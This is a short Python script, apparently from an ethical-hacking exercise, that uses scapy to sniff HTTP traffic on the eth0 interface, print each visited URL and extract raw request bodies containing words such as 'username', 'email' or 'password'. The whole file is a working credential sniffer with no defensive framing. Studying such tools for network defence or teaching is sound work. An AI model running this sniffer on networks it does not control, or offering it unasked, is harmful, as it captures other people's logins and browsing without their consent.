#!/usr/bin/env python3


import scapy.all as scapy
from scapy.layers import http


def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=sniffed_packets)


def get_url(packets):
    return packets[http.HTTPRequest].Host + packets[http.HTTPRequest].Path


def get_login(packets):
    if packets.haslayer(scapy.Raw):
        login = packets[scapy.Raw].load
        filters = ["username", "uname", "user", "email", "mail", "password", "pass", "login"]
        for elements in filters:
            if elements in str(login):
                return login


def sniffed_packets(packets):
    if packets.haslayer(http.HTTPRequest):
        url = get_url(packets)
        print("[+] URL: " + url.decode())
        login = get_login(packets)
        if login:
            print("-------------------------\n[+] Login: " + login.decode() + "\n-------------------------")


sniffer("eth0")
